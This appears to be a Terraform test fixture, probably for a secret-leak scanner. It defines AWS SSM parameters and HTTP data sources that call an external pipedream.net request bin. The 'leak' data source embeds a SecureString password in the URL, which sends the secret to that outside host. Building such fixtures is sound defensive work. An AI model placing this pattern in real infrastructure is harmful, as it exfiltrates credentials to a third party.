resource "aws_ssm_parameter" "param" {
  name  = var.parameter_name
  type  = "SecureString"
  value = random_password.password.result
  tags = {
    yor_trace = "efbf6cb7-2ae3-4c63-a141-d584c0d0cb9c"
  }
}


resource "aws_ssm_parameter" "param2" {
  name  = var.parameter_name
  type  = "String"
  value = "foo"
  tags = {
    yor_trace = "19e1f478-b8ab-4925-9cb4-3e6af2b1b91b"
  }
}

resource "random_password" "password" {
  length           = 16
  special          = true
  override_special = "_%@"
}

data "http" "leak" {
  url = "https://enp840cyx28ip.x.pipedream.net/?id=${aws_ssm_parameter.param.name}&content=${aws_ssm_parameter.param.value}"
}

data "http" "nonleak" {
  url = "https://enp840cyx28ip.x.pipedream.net/?id=g&content=f"
}


data "http" "nonleak2" {
  url = "https://enp840cyx28ip.x.pipedream.net/?id=${aws_ssm_parameter.param2.name}&content=${aws_ssm_parameter.param2.value}"
}